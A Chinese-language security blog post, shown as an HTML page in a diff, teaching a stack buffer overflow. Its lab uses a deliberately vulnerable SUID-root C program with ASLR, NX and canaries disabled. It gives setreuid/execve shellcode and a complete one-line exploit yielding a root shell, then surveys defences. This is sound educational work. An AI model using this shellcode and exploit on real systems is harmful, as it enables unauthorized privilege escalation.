@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="hgJm_NMToxnJSGCvEYC7x0VsU5DdYaEjpBAhqdc-eR8">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Or1onX.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="bin Linux,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Or1onX's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="0x00 前言 缓冲区溢出是一种历史悠久的漏洞，早在 1988 年，由罗伯特,莫里斯(R ob。rtMorris)制造的 Morris 蠕虫，它曾造成全世界6000多台网络服务器瘫痪。 虽然这一漏洞出现时间很久远，现有的防御方法也很有效，但我觉得它依然有很大的研究意义。毕竟攻防没有任何一端会停滞，理解旧的漏洞也是为了更好地理解新的攻击手段，进而更好地完善防御方法。  0x01 环境 ubuntu">
+<meta name="keywords" content="bin Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探缓冲区溢出">
+<meta property="og:url" content="https://or1onx.github.io/初探缓冲区溢出/index.html">
+<meta property="og:site_name" content="Or1onX&#39;s blog">
+<meta property="og:description" content="0x00 前言 缓冲区溢出是一种历史悠久的漏洞，早在 1988 年，由罗伯特,莫里斯(R ob。rtMorris)制造的 Morris 蠕虫，它曾造成全世界6000多台网络服务器瘫痪。 虽然这一漏洞出现时间很久远，现有的防御方法也很有效，但我觉得它依然有很大的研究意义。毕竟攻防没有任何一端会停滞，理解旧的漏洞也是为了更好地理解新的攻击手段，进而更好地完善防御方法。  0x01 环境 ubuntu">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqtvpgsl0bj20e402mgm1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqtvsw6hskj20hc04875p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqtxbmmkgmj20nn021mxv.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqtxdguz12j20jx02mmy7.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqw9rm5u32j20io0q5dw6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqx9s2f5aij20gu05macj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqx9pb7j4wj20op0f2tjd.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqxa0vnl9nj20on04m0vr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqxa126tdlj20ot08uq7p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqxa7fqp4aj20ok07hq8c.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqw8jxzlsuj20i305utax.jpg">
+<meta property="og:updated_time" content="2018-05-04T10:40:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初探缓冲区溢出">
+<meta name="twitter:description" content="0x00 前言 缓冲区溢出是一种历史悠久的漏洞，早在 1988 年，由罗伯特,莫里斯(R ob。rtMorris)制造的 Morris 蠕虫，它曾造成全世界6000多台网络服务器瘫痪。 虽然这一漏洞出现时间很久远，现有的防御方法也很有效，但我觉得它依然有很大的研究意义。毕竟攻防没有任何一端会停滞，理解旧的漏洞也是为了更好地理解新的攻击手段，进而更好地完善防御方法。  0x01 环境 ubuntu">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqtvpgsl0bj20e402mgm1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://or1onx.github.io/初探缓冲区溢出/">
+
+
+
+
+
+  <title>初探缓冲区溢出 | Or1onX's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Or1onX's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://or1onx.github.io/初探缓冲区溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Or1onX">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Or1onX.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Or1onX's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">初探缓冲区溢出</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T23:29:49+08:00">
+                2018-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span id="busuanzi_value_page_pv"></span>次阅读
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul>
+<li>缓冲区溢出是一种历史悠久的漏洞，早在 1988 年，由罗伯特,莫里斯(R ob。rtMorris)制造的 Morris 蠕虫，它曾造成全世界6000多台网络服务器瘫痪。</li>
+<li>虽然这一漏洞出现时间很久远，现有的防御方法也很有效，但我觉得它依然有很大的研究意义。毕竟攻防没有任何一端会停滞，理解旧的漏洞也是为了更好地理解新的攻击手段，进而更好地完善防御方法。</li>
+</ul>
+<h1 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h1><ul>
+<li><p>ubuntu 16.04.4 LTS x86-64</p>
+</li>
+<li><p>由于现代操作系统针对缓冲区溢出已经有很完善的防御机制，为方便演示，我们进行如下配置：</p>
+<ul>
+<li><p>关闭 ASLR<br>  在<code>/proc/sys/kernel/randomize_va_space</code>文件中保存有 ASLR 的信息，开启时的值不为 0<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqtvpgsl0bj20e402mgm1.jpg" alt></p>
+<a id="more"></a>
+<p>  我们切换到 root 用户，执行</p>
+  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="http://ww1.sinaimg.cn/large/a105112bly1fqtvsw6hskj20hc04875p.jpg" alt><br>  这样就关闭了 ASLR</p>
+</li>
+<li><p>关闭 NX 和 栈保护（Canary）<br>编译参数：<code>gcc -g -m32 -fno-stack-protector -z execstack</code></p>
+</li>
+</ul>
+</li>
+<li><p>文章最后会具体介绍防御的方法</p>
+</li>
+</ul>
+<h1 id="0x02-具体步骤"><a href="#0x02-具体步骤" class="headerlink" title="0x02 具体步骤"></a>0x02 具体步骤</h1><ol>
+<li><p>首先看一下源代码</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 通过 strcpy 函数，我们将<code>argv[1]</code>的值直接拷贝给 buf，如果长度大于其缓冲区的长度，将会发生溢出，只要能正确覆盖 vuln 的返回值，我们就能控制程序流。</p>
+</li>
+<li><p>编译并将可执行程序的所有者改为 root，并置 SUID 位<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqtxbmmkgmj20nn021mxv.jpg" alt><br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqtxdguz12j20jx02mmy7.jpg" alt></p>
+</li>
+<li><p>对 main 和 vuln 反汇编<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqw9rm5u32j20io0q5dw6.jpg" alt><br><code>lea -0x88(%esp), %eax</code>是将 buf 的起始地址赋值给 eax 寄存器，因此，buf 距离 ebp 的偏移是 0x88，payload 总长度再加上 4 字节（覆盖 ebp）和 4 字节（覆盖返回地址）即可。这样，我们可以这样构造 payload：<code>blabla（96 字节） + shellcode（44 字节） + ret_addr（4 字节）</code></p>
+</li>
+<li><p>那么shellcode 应该长啥样呢？</p>
+<ul>
+<li><p>首先要明确两点，一是获取 shell，二是以 root 权限执行，为方便实现后者，我已经在第二步对可执行程序设置了 SUID 位。</p>
+</li>
+<li><p>对于第一点，我们可以让程序执行<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>这样的语句，在 x86 32 位平台下，该函数执行本质是这样的：三个参数分别保存到 ebx、ecx、edx，进而根据系统调用号（存放在 eax 中），通过<code>int 0x80</code>中断，调用了<code>sys_execve</code>。因此，构造的 shellcode 类似这样：</p>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="string">"/bin/sh"</span>, %ebx</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>, %ecx</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>, %edx</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>xb, %eax</span><br><span class="line"><span class="keyword">int</span> <span class="number">$0</span>x80             <span class="comment">;调用 execve</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对于第二点，我们可以通过<code>setreuid(geteuid(), geteuid())</code>实现，该函数将<code>geteuid()</code>（根据 SUID 位，返回值是 0）得到的值设置为目前进程真实用户识别码，这样，获得的 shell 就是 root 用户的了。为此，shellcode 类似这样：</p>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>xc9, %eax</span><br><span class="line"><span class="keyword">int</span> <span class="number">$0</span>x80             <span class="comment">;调用 geteuid，返回值存于 eax</span></span><br><span class="line"><span class="keyword">mov</span> %eax, %ebx</span><br><span class="line"><span class="keyword">mov</span> %eax, %ecx</span><br><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>xcb, %eax</span><br><span class="line"><span class="keyword">int</span> <span class="number">$0</span>x80             <span class="comment">;调用 setreuid</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由于程序编译成 32 位，因此系统调用号可以按下面的方法找：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqx9s2f5aij20gu05macj.jpg" alt></p>
+</li>
+<li><p>完整 shellcode 如下：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqx9pb7j4wj20op0f2tjd.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>最后，要确定 shellcode 的地址，<strong>由于关闭了 ASLR，所以每次执行程序，shellcode 在地址空间中的位置都是不变的</strong>。我们 gdb 调试程序：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqxa0vnl9nj20on04m0vr.jpg" alt><br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqxa126tdlj20ot08uq7p.jpg" alt><br>shellcode 会出现在 0xffffd181 处，所以，payload 最后面四个字节应该是（注意是小端序）：<code>\x81\xd1\xff\xff</code></p>
+</li>
+<li><p>exp</p>
+ <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./overflow `python -c <span class="string">'print "A" * 46 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 50 + "\x81\xd1\xff\xff"'</span>`</span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqxa7fqp4aj20ok07hq8c.jpg" alt></p>
+<h1 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h1><p>通过 checksec 看一下可执行程序的防御机制<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqw8jxzlsuj20i305utax.jpg" alt><br>Arch 是运行平台</p>
+</li>
+<li><p>RELRO<br> RELRO会有 Partial RELRO 和 FULL RELRO，如果开启FULL RELRO，意味着我们无法修改 GOT 表</p>
+</li>
+<li><p>Stack<br> 要想执行任意代码，需要覆盖函数的返回地址。Canary 机制就是为了防止这一手段，可以把它看成是一个随机值，在被调用函数压入 EBP 前压入栈（即位于返回地址和 EBP 之间），<strong>当函数返回时，会先验证这个值是否改变，如果改变了，程序停止执行</strong>。这样就防止攻击者覆盖返回地址。当然，如果 Canary 随机值由于某种情况泄漏，依然可以造成攻击。</p>
+</li>
+<li><p>NX<br> 也称 DEP（数据执行保护），如果启用，地址空间中任何<strong>用户可控的地方都会禁止执行，可执行部分也禁止用户写入</strong>。常通过 Ret2Lib 以及 ROP 去绕过。</p>
+</li>
+<li><p>PIE<br> 如果开启了，程序每次运行地址都会变化（比如库函数、变量等，再例如之前的 shellcode 地址就没法通过gdb 调试得到结果，<strong>因为每次执行程序 shellcode 的地址都不同</strong>）。但仍可通过 libc 基址泄漏、构造 ROP 方式构造攻击向量，甚至在 32 位机器上可以暴力破解。</p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Or1onX
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://or1onx.github.io/初探缓冲区溢出/" title="初探缓冲区溢出">https://or1onx.github.io/初探缓冲区溢出/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bin-Linux/" rel="tag"># bin Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Linux下进程状态的切换/" rel="next" title="Linux下进程状态的切换">
+                <i class="fa fa-chevron-left"></i> Linux下进程状态的切换
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/narnia-writeup/" rel="prev" title="narnia writeup">
+                narnia writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Or1onX.jpg" alt="Or1onX">
+            
+              <p class="site-author-name" itemprop="name">Or1onX</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry, stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-环境"><span class="nav-text">0x01 环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-具体步骤"><span class="nav-text">0x02 具体步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-防御"><span class="nav-text">0x03 防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Or1onX</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a rel="external nofollow" class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a rel="external nofollow" class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
